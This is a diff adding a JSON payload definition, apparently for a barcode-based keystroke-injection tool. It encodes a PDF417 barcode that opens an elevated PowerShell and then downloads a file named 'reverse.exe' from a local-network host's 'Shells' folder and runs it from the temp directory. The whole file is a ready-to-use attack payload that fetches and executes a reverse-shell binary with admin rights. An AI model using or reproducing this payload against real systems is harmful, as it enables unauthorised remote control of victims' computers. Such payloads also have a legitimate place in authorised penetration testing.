@@ -1,0 +1,16 @@
+{
+  "name": "Download and run exe",
+  "description": "Opens PowerShell as admin, then downloads an exe and runs it",
+  "symbology": "pdf417",
+  "bwippoptions": "columns=2",
+
+  "setup-dependencies": [
+    "run-win-r-uac",
+    "map-enter"
+  ],
+
+  "payload": [
+    "`06powershell start-process -verb runas powershell.exe",
+    "`05IEX (New-Object Net.WebClient).DownloadFile('http://192.168.43.249/Shells/reverse.exe',\"$env:temp\\s.exe\");Start-Process \"$env:temp\\s.exe\""
+  ]
+}
